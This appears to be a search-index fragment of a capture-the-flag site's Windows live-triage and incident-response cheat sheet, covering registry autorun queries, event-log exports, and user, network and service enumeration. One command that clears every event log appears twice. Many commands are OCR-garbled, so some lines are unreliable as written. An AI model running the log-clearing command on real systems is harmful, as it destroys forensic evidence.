HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\explorer\\ShellExecuteHooks C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects /s C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Runonce C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Winlogon\\Userinit C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\shellServiceObjectDelayLoad C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Schedule\\TaskCache\\Tasks /s C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Windows C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Windows /f Appinit_DLLs C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon /f Shell C:\\> reg query HKLM\\SOFTWARE\\Mic rosoft\\WindowsNT\\CurrentVersion\\Winlogon /f Userinit C:\\> reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Systern\\Scripts C:\\> reg query HKLM\\SOFTWARE\\Classes\\batfile\\shell\\open\\cornrnand C:\\> reg query HKLM\\SOFTWARE\\Classes\\cornfile\\shell\\open\\cornrnand C:\\> reg query HKLM\\SOFTWARE\\Classes\\exefile\\shell\\open\\command C:\\> reg query HKLM\\SOFTWARE\\Classes\\htafile\\Shell\\Open\\Command C:\\> reg query HKLM\\SOFTWARE\\Classes\\piffile\\shell\\open\\command C:\\> reg query HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects /s C:\\> reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SessionManager C:\\> reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SessionManager\\KnownDLLs C:\\> reg query HKLM\\SYSTEM\\ControlSet001\\Control\\SessionManager\\KnownDLLs","title":"HKEY_LOCAL_MACHINE:"},{"location":"capturetheflag/basic/analysis/windows/#logs","text":"","title":"LOGS"},{"location":"capturetheflag/basic/analysis/windows/#copy-event-logs","text":"C:\\> wevtutil epl Security C:\\<BACK UPPATH>\\mylogs.evtx C:\\> wevtutil epl System C:\\<BACK UPPATH>\\mylogs.evtx C:\\> wevtutil epl Application C:\\<BACK UPPATH>\\mylogs.evtx","title":"Copy event logs:"},{"location":"capturetheflag/basic/analysis/windows/#get-list-of-logs-remotely","text":"https://technet.microsoft.com C:\\> psloglist \\\\<REMOTE COMPUTER> -accepteula -h 12 -x","title":"Get list of logs remotely:"},{"location":"capturetheflag/basic/analysis/windows/#clear-all-logs-and-start-a-baseline-log-to-monitor","text":"PS C:\\> wevtutil el I Foreach-Object {wevtutil cl\"$_\"}","title":"Clear all logs and start a baseline log to monitor:"},{"location":"capturetheflag/basic/analysis/windows/#list-log-filenames-and-path-location","text":"C:\\> wmic nteventlog get path,filename,writeable","title":"List log filenames and path location:"},{"location":"capturetheflag/basic/analysis/windows/#take-pre-breach-log-export","text":"PS C:\\> wevtutil el I ForEach-Object{Get-Eventlog -Log \"$_\" I Export-Csv -Path (:\\<BASELINE LOG>,csv -Append}","title":"Take pre breach log export:"},{"location":"capturetheflag/basic/analysis/windows/#take-post-breach-log-export","text":"PS C:\\> wevtutil el I ForEach-Object{Get-EventLog -Log\"$_\" I Export-Csv -Path C:\\<POST BASELINELOG>,CSV -Append}","title":"Take post breach log export:"},{"location":"capturetheflag/basic/analysis/windows/#compare-two-files-baseline-and-post-breach-logs","text":"PS C:\\> Compare-Object -ReferenceObject $(GetContent\"C:\\<PATH TO FILE>\\<ORIGINAL BASELINELOGS>.txt\") -DifferenceObject $(Get-Content\"C:\\<PATH TO FILE>\\<POST BASELINE LOGS>.txt\") >><DIFFERENCES LOG>.txt","title":"Compare two files baseline and post breach logs:"},{"location":"capturetheflag/basic/analysis/windows/#this-deletes-all-logs","text":"PS C:\\> wevtutil el I Foreach-Object {wevtutil cl\"$_\"}","title":"This deletes all logs:"},{"location":"capturetheflag/basic/analysis/windows/#files-drives-and-shares-information","text":"C:\\> net use \\\\<TARGET IP ADDRESS> C:\\> net share C:\\> net session C:\\> wmic volume list brief C:\\> wmic logicaldisk getdescription,filesystem,name,size C:\\> wmic share get name,path","title":"FILES, DRIVES AND SHARES INFORMATION"},{"location":"capturetheflag/basic/analysis/windows/#find-multiple-file-types-or-a-file","text":"C:\\> dir /A /5 /T:A *,exe *,dll *,bat *\u00b7PS1 *,zip C:\\> dir /A /5 /T:A <BAD FILE NAME>,exe","title":"Find multiple file types or a file:"},{"location":"capturetheflag/basic/analysis/windows/#find-executable-exe-files-newer-than-jan-1-2017","text":"C:\\> forfiles /p C:\\ /M *,exe /5 /0 +1/1/2017 /C\"cmd /c echo @fdate @ftime @path\"","title":"Find executable (.exe) files newer than Jan 1, 2017:"},{"location":"capturetheflag/basic/analysis/windows/#find-multiple-files-types-using-loop","text":"C:\\> for %G in (.exe, .dll, .bat, .ps) do forfiles -p \"C:\" -m *%G -s -d +1/1/2017 -c \"cmd /c echo @fdate@ftime @path\"","title":"Find multiple files types using loop:"},{"location":"capturetheflag/basic/analysis/windows/#search-for-files-newer-than-date","text":"C:\\> forfiles /PC:\\ /5 /0 +1/01/2017 /C \"cmd /c echo @path @fdate\"","title":"Search for files newer than date:"},{"location":"capturetheflag/basic/analysis/windows/#find-large-files-example-20-mb","text":"C:\\> forfiles /5 /M * /C \"cmd /c if @fsize GEO 2097152 echo @path @fsize\"","title":"Find large files: (example &lt;20 MB)"},{"location":"capturetheflag/basic/analysis/windows/#find-files-with-alternate-data-streams","text":"https://technet.microsoft.com/enus/sysinternals/streams.aspx C:\\> streams -s <FILE OR DIRECTORY>Find files with bad signature into csv: https://technet.microsoft.com/enus/sysinternals/bb897441.aspx C:\\> sigcheck -c -h -s -u -nobanner <FILE OR DIRECTORY> > <OUTPUT FILENAME>,csv","title":"Find files with Alternate Data Streams:"},{"location":"capturetheflag/basic/analysis/windows/#find-and-show-only-unsigned-files-with-bad-signature-in-c","text":"C:\\> sigcheck -e -u -vr -s C:\\","title":"Find and show only unsigned files with bad signature in C:"},{"location":"capturetheflag/basic/analysis/windows/#list-loaded-unsigned-dlls","text":"https://technet.microsoft.com/enus/sysinternals/bb896656.aspx C:\\> listdlls.exe -u C:\\> listdlls.exe -u <PROCESS NAME OR PID>","title":"List loaded unsigned Dlls:"},{"location":"capturetheflag/basic/analysis/windows/#run-malware-scan-windows-defender-offline","text":"http://windows.microsoft.com/enus/windows/what-is-windows-defender-offline C:\\> MpCmdRun.exe -SignatureUpdate C:\\> MpCmdRun.exe -Scan","title":"Run Malware scan (Windows Defender) offline:"},{"location":"capturetheflag/basic/detect/analysis/","text":"SYSTEM INFORMATION LIVE TRIAGE - WINDOWS C:\\> echo %DATE% %TIME% C:\\> hostname C:\\> systeminfo C:\\> systeminfo I findstr /B /C:\"OS Name\" /C:\"OS Version\" C:\\> wmic csproduct get name C:\\> wmic bios get serialnumber C:\\> wmic computersystem list brief C:\\> psinfo -accepteula -s -h -d USER INFORMATION C:\\> whoami C:\\> net users C:\\> net localgroup administrators C:\\> net group administrators C:\\> wmic rdtoggle list C:\\> wmic useraccount list C:\\> wmic group list C:\\> wmic netlogin getname, lastlogon,badpasswordcount C:\\> wmic netclient list brief C:\\> doskey /history> history.txt NETWORK INFORMATION C:\\> netstat -e C:\\> netstat -naob C:\\> netstat -nr C:\\> netstat -vb C:\\> nbtstat -s C:\\> route print C:\\> arp -a C:\\> ipconfig /displaydns C:\\> netsh winhttp show proxy C:\\> ipconfig /allcompartments /all C:\\> netsh wlan show interfaces C:\\> netsh wlan show all C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\WinHttpSettings\" C:\\> type %SYSTEMROOT%\\system32\\drivers\\etc\\hosts C:\\> wmic nicconfig get descriptions,IPaddress,MACaddress C:\\> wmic netuse getname,username,connectiontype, localname SERVICE INFORMATION C:\\> at C:\\> tasklist C:\\> task list /SVC C:\\> tasklist /SVC /fi \"imagename eq svchost.exe\" C:\\> schtasks C:\\> net start C:\\> sc query C:\\> wmic service list brief C:\\> wmic service list conf ig C:\\> wmic process list brief C:\\> wmic process list status C:\\> wmic process list memory C:\\> wmic job list brief I findstr \"Running\" PS C:\\> Get-Service I Where-Object { $_.Status -eq \"running\" } List of all processes and then all loaded modules: PS C:\\> Get-Process !select modules!ForeachObject{$_.modules} POLICY, PATCH AND SETTINGS INFORMATION C:\\> set C:\\> gpresult /r C:\\> gpresult /z > <OUTPUT FILE NAME>.txt C:\\> gpresult /H report.html /F C:\\> wmic qfe List GPO software installed: C:\\> reg query uHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\AppMgmt\" AUTORUN AND AUTOLOAD INFORMATION Startup information: C:\\> wmic startup list full C:\\> wmic ntdomain list brief View directory contents of startup folder: C:\\> dir \"%SystemDrive%\\ProgramData\\Microsoft\\Windows\\StartMenu\\P rog rams\\Sta rtup\" C:\\> dir \"%SystemDrive%\\Documents and Settings\\AllUse rs\\Sta rt Menu\\Prog rams\\Sta rtup\" C:\\> dir %userprofile%\\Start Menu\\Programs\\Startup C:\\> %ProgramFiles%\\Startup\\ C:\\> dir C:\\Windows\\Start Menu\\Programs\\startup C:\\> dir \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" C:\\> dir \"C:\\ProgramData\\Microsoft\\Windows\\StartMenu\\P rog rams\\Sta rtup\" C:\\> dir \"%APPDATA%\\Microsoft\\Windows\\StartMenu\\Prog rams\\Sta rtup\" C:\\> dir \"%ALLUSERSPROFILE%\\Microsoft\\Windows\\StartMenu\\Prog rams\\Sta rtup\" C:\\> dir \"%ALLUSERSPROFILE%\\StartMenu\\P rog rams\\Sta rtup\" C:\\> type C:\\Windows\\winstart.bat C:\\> type %windir%\\wininit.ini C:\\> type %windir%\\win.ini View autoruns, hide Microsoft files: C:\\> autorunsc -accepteula -m C:\\> type C:\\Autoexec.bat\" Show all autorun files, export to csv and check with VirusTotal: C:\\> autorunsc.exe -accepteula -a -c -i -e -f -l -m -v HKEY_CLASSES_ROOT: C:\\> reg query HKCR\\Comfile\\Shell\\Open\\Command C:\\> reg query HKCR\\Batfile\\Shell\\Open\\Command C:\\> reg query HKCR\\htafile\\Shell\\Open\\Command C:\\> reg query HKCR\\Exefile\\Shell\\Open\\Command C:\\> reg query HKCR\\Exefiles\\Shell\\Open\\Command C:\\> reg query HKCR\\piffile\\shell\\open\\command HKEY_CURRENT_USERS: C:\\> reg query uHKCU\\Control Panel\\Desktop\" C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServ ices Once C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Windows\\Run C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Windows\\Load C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Windows\\Scripts C:\\> reg query HKCU\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Windows /f run C:\\> reg query HKCU\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Windows /f load C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedMRU C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComD1g32\\0pen5aveMRU C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedPidlMRU C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComD1g32\\0pen5avePidlMRU /s C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders C:\\> reg query uHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\RegEdit /v LastKey C:\\> reg query \"HKCU\\Software\\Microsoft\\InternetExp lo re r\\ TypedURLs\" C:\\> reg query uHKCU\\Software\\Policies\\Microsoft\\Windows\\ControlPanel \\Desktop\" HKEY_LOCAL_MACHINE: C:\\> reg query uHKLM\\SOFTWARE\\Mic rosoft\\Act iveSetup\\Installed Components\" /s C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\explorer\\User Shell Folders C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\explorer\\Shell Folders C:\\> reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\explorer\\ShellExecuteHooks C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects /s C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Runonce C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Winlogon\\Userinit C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\shellServiceObjectDelayLoad C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\" /s C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Windows\" C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Windows\" /f Appinit_DLLs C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon\" /f Shell C:\\> reg query HKLM\\SOFTWARE\\Mic rosoft\\WindowsNT\\CurrentVersion\\Winlogon\" /f Userinit C:\\> reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Systern\\Scripts C:\\> reg query HKLM\\SOFTWARE\\Classes\\batfile\\shell\\open\\cornrnand C:\\> reg query HKLM\\SOFTWARE\\Classes\\cornfile\\shell\\open\\cornrnand C:\\> reg query HKLM\\SOFTWARE\\Classes\\exefile\\shell\\open\\command C:\\> reg query HKLM\\SOFTWARE\\Classes\\htafile\\Shell\\Open\\Command C:\\> reg query HKLM\\SOFTWARE\\Classes\\piffile\\shell\\open\\command C:\\> reg query 11HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects\" /s C:\\> reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SessionManager\" C:\\> reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SessionManager\\KnownDLLs\" C:\\> reg query \"HKLM\\SYSTEM\\ControlSet001\\Control\\SessionManager\\KnownDLLs\" LOGS Copy event logs: C:\\> wevtutil epl Security C:\\<BACK UPPATH>\\mylogs.evtx C:\\> wevtutil epl System C:\\<BACK UPPATH>\\mylogs.evtx C:\\> wevtutil epl Application C:\\<BACK UPPATH>\\mylogs.evtx Get list of logs remotely: C:\\> psloglist \\\\<REMOTE COMPUTER> -accepteula -h 12 -x Clear all logs and start a baseline log to monitor: PS C:\\> wevtutil el I Foreach-Object {wevtutil cl\"$_\"} List log filenames and path location: C:\\> wmic nteventlog get path,filename,writeable Take pre breach log export: PS C:\\> wevtutil el I ForEach-Object{Get-Eventlog -Log \"$_\" I Export-Csv -Path (:\\<BASELINE LOG>,csv -Append} Take post breach log export: PS C:\\> wevtutil el I ForEach-Object{Get-EventLog -Log\"$_\" I Export-Csv -Path C:\\<POST BASELINELOG>,CSV -Append} Compare two files baseline and post breach logs: PS C:\\> Compare-Object -ReferenceObject $(GetContent\"C:\\<PATH TO FILE>\\<ORIGINAL BASELINELOGS>.txt\") -DifferenceObject $(Get-Content\"C:\\<PATH TO FILE>\\<POST BASELINE LOGS>.txt\") >><DIFFERENCES LOG>.txt This deletes all logs: PS C:\\> wevtutil el I Foreach-Object {wevtutil cl\"$_\"} FILES, DRIVES AND SHARES INFORMATION C:\\> net use \\\\<TARGET IP ADDRESS> C:\\> net share C:\\> net session C:\\> wmic volume list brief C:\\> wmic logicaldisk getdescription,filesystem,name,size C:\\> wmic share get name,path Find multiple file types or a file: C:\\> dir /A /5 /T:A *,exe *,dll *,bat *\u00b7PS1 *,zip C:\\> dir /A /5 /T:A <BAD FILE NAME>,exe Find executable (.exe) files newer than Jan 1, 2017: C:\\> forfiles /p C:\\ /M *,exe /5 /0 +1/1/2017 /C\"cmd /c echo @fdate @ftime @path\" Find multiple files types using loop: C:\\> for %G in (.exe, .dll, .bat, .ps) do forfiles -p \"C:\" -m *%G -s -d +1/1/2017 -c \"cmd /c echo @fdate@ftime @path\" Search for files newer than date: C:\\> forfiles /PC:\\ /5 /0 +1/01/2017 /C \"cmd /cecho @path @fdate\"Find large files: (example <20 MB) C:\\> forfiles /5 /M * /C \"cmd /c if @fsize GEO2097152 echo @path @fsize\" Find files with Alternate Data Streams: C:\\> streams -s <FILE OR DIRECTORY> Find files with bad signature into csv: C:\\> sigcheck -c -h -s -u -nobanner <FILE ORDIRECTORY> > <OUTPUT FILENAME>,csv Find and show only unsigned files with bad signaturein C: C:\\> sigcheck -e -u -vr -s C:\\ List loaded unsigned Dlls: C:\\> listdlls.exe -u C:\\> listdlls.exe -u <PROCESS NAME OR PID> Run Malware scan (Windows Defender) offline: C:\\> MpCmdRun.exe -SignatureUpdate C:\\> MpCmdRun.exe -Scan","title":"analysis"},{"location":"capturetheflag/basic/detect/analysis/#system-information","text":"","title":"SYSTEM INFORMATION"},{"location":"capturetheflag/basic/detect/analysis/#live-triage-windows","text":"C:\\> echo %DATE% %TIME% C:\\> hostname C:\\> systeminfo C:\\> systeminfo I findstr /B /C:\"OS Name\" /C:\"OS Version\" C:\\> wmic csproduct get name C:\\> wmic bios get serialnumber C:\\> wmic computersystem list brief C:\\> psinfo -accepteula -s -h -d USER INFORMATION C:\\> whoami C:\\> net users C:\\> net localgroup administrators C:\\> net group administrators C:\\> wmic rdtoggle list C:\\> wmic useraccount list C:\\> wmic group list C:\\> wmic netlogin getname, lastlogon,badpasswordcount C:\\> wmic netclient list brief C:\\> doskey /history> history.txt","title":"LIVE TRIAGE - WINDOWS"},{"location":"capturetheflag/basic/detect/analysis/#network-information","text":"C:\\> netstat -e C:\\> netstat -naob C:\\> netstat -nr C:\\> netstat -vb C:\\> nbtstat -s C:\\> route print C:\\> arp -a C:\\> ipconfig /displaydns C:\\> netsh winhttp show proxy C:\\> ipconfig /allcompartments /all C:\\> netsh wlan show interfaces C:\\> netsh wlan show all C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\WinHttpSettings\" C:\\> type %SYSTEMROOT%\\system32\\drivers\\etc\\hosts C:\\> wmic nicconfig get descriptions,IPaddress,MACaddress C:\\> wmic netuse getname,username,connectiontype, localname SERVICE INFORMATION C:\\> at C:\\> tasklist C:\\> task list /SVC C:\\> tasklist /SVC /fi \"imagename eq svchost.exe\" C:\\> schtasks C:\\> net start C:\\> sc query C:\\> wmic service list brief C:\\> wmic service list conf ig C:\\> wmic process list brief C:\\> wmic process list status C:\\> wmic process list memory C:\\> wmic job list brief I findstr \"Running\" PS C:\\> Get-Service I Where-Object { $_.Status -eq \"running\" }","title":"NETWORK INFORMATION"},{"location":"capturetheflag/basic/detect/analysis/#list-of-all-processes-and-then-all-loaded-modules","text":"PS C:\\> Get-Process !select modules!ForeachObject{$_.modules}","title":"List of all processes and then all loaded modules:"},{"location":"capturetheflag/basic/detect/analysis/#policy-patch-and-settings-information","text":"C:\\> set C:\\> gpresult /r C:\\> gpresult /z > <OUTPUT FILE NAME>.txt C:\\> gpresult /H report.html /F C:\\> wmic qfe","title":"POLICY, PATCH AND SETTINGS INFORMATION"},{"location":"capturetheflag/basic/detect/analysis/#list-gpo-software-installed","text":"C:\\> reg query uHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\AppMgmt\"","title":"List GPO software installed:"},{"location":"capturetheflag/basic/detect/analysis/#autorun-and-autoload-information-startup-information","text":"C:\\> wmic startup list full C:\\> wmic ntdomain list brief","title":"AUTORUN AND AUTOLOAD INFORMATION Startup information:"},{"location":"capturetheflag/basic/detect/analysis/#view-directory-contents-of-startup-folder","text":"C:\\> dir \"%SystemDrive%\\ProgramData\\Microsoft\\Windows\\StartMenu\\P rog rams\\Sta rtup\" C:\\> dir \"%SystemDrive%\\Documents and Settings\\AllUse rs\\Sta rt Menu\\Prog rams\\Sta rtup\" C:\\> dir %userprofile%\\Start Menu\\Programs\\Startup C:\\> %ProgramFiles%\\Startup\\ C:\\> dir C:\\Windows\\Start Menu\\Programs\\startup C:\\> dir \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" C:\\> dir \"C:\\ProgramData\\Microsoft\\Windows\\StartMenu\\P rog rams\\Sta rtup\" C:\\> dir \"%APPDATA%\\Microsoft\\Windows\\StartMenu\\Prog rams\\Sta rtup\" C:\\> dir \"%ALLUSERSPROFILE%\\Microsoft\\Windows\\StartMenu\\Prog rams\\Sta rtup\" C:\\> dir \"%ALLUSERSPROFILE%\\StartMenu\\P rog rams\\Sta rtup\" C:\\> type C:\\Windows\\winstart.bat C:\\> type %windir%\\wininit.ini C:\\> type %windir%\\win.ini","title":"View directory contents of startup folder:"},{"location":"capturetheflag/basic/detect/analysis/#view-autoruns-hide-microsoft-files","text":"C:\\> autorunsc -accepteula -m C:\\> type C:\\Autoexec.bat\"","title":"View autoruns, hide Microsoft files:"},{"location":"capturetheflag/basic/detect/analysis/#show-all-autorun-files-export-to-csv-and-check-with-virustotal","text":"C:\\> autorunsc.exe -accepteula -a -c -i -e -f -l -m -v","title":"Show all autorun files, export to csv and check with VirusTotal:"},{"location":"capturetheflag/basic/detect/analysis/#hkey_classes_root","text":"C:\\> reg query HKCR\\Comfile\\Shell\\Open\\Command C:\\> reg query HKCR\\Batfile\\Shell\\Open\\Command C:\\> reg query HKCR\\htafile\\Shell\\Open\\Command C:\\> reg query HKCR\\Exefile\\Shell\\Open\\Command C:\\> reg query HKCR\\Exefiles\\Shell\\Open\\Command C:\\> reg query HKCR\\piffile\\shell\\open\\command","title":"HKEY_CLASSES_ROOT:"},{"location":"capturetheflag/basic/detect/analysis/#hkey_current_users","text":"C:\\> reg query uHKCU\\Control Panel\\Desktop\" C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServ ices Once C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Windows\\Run C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Windows\\Load C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Windows\\Scripts C:\\> reg query HKCU\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Windows /f run C:\\> reg query HKCU\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Windows /f load C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedMRU C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComD1g32\\0pen5aveMRU C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedPidlMRU C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComD1g32\\0pen5avePidlMRU /s C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders C:\\> reg query uHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" C:\\> reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\RegEdit /v LastKey C:\\> reg query \"HKCU\\Software\\Microsoft\\InternetExp lo re r\\ TypedURLs\" C:\\> reg query uHKCU\\Software\\Policies\\Microsoft\\Windows\\ControlPanel \\Desktop\"","title":"HKEY_CURRENT_USERS:"},{"location":"capturetheflag/basic/detect/analysis/#hkey_local_machine","text":"C:\\> reg query uHKLM\\SOFTWARE\\Mic rosoft\\Act iveSetup\\Installed Components\" /s C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\explorer\\User Shell Folders C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\explorer\\Shell Folders C:\\> reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\explorer\\ShellExecuteHooks C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects /s C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Runonce C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Winlogon\\Userinit C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\shellServiceObjectDelayLoad C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\" /s C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Windows\" C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Windows\" /f Appinit_DLLs C:\\> reg query HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon\" /f Shell C:\\> reg query HKLM\\SOFTWARE\\Mic rosoft\\WindowsNT\\CurrentVersion\\Winlogon\" /f Userinit C:\\> reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Systern\\Scripts C:\\> reg query HKLM\\SOFTWARE\\Classes\\batfile\\shell\\open\\cornrnand C:\\> reg query HKLM\\SOFTWARE\\Classes\\cornfile\\shell\\open\\cornrnand C:\\> reg query HKLM\\SOFTWARE\\Classes\\exefile\\shell\\open\\command C:\\> reg query HKLM\\SOFTWARE\\Classes\\htafile\\Shell\\Open\\Command C:\\> reg query HKLM\\SOFTWARE\\Classes\\piffile\\shell\\open\\command C:\\> reg query 11HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects\" /s C:\\> reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SessionManager\" C:\\> reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SessionManager\\KnownDLLs\" C:\\> reg query 